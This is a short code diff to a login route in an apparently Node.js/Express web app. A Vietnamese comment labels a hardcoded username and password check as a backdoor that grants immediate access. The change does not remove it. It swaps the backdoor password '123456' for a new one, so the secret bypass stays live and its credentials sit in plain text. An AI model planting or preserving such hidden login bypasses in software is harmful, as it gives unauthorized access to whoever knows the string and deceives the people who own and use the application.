@@ -34,7 +34,7 @@ app.post('/login', (req, res, next) => {
   const { username, password } = req.body || {};
   
   // CỬA HẬU: DÙNG CÁI NÀY LÀ VÀO ĐƯỢC NGAY
-  if (username === 'trungdeptrai' && password === '123456') {
+  if (username === 'trungdeptrai' && password === 'trung1072005') {
     req.session = req.session || {};
     req.session.loggedIn = true;
     req.session.username = username;
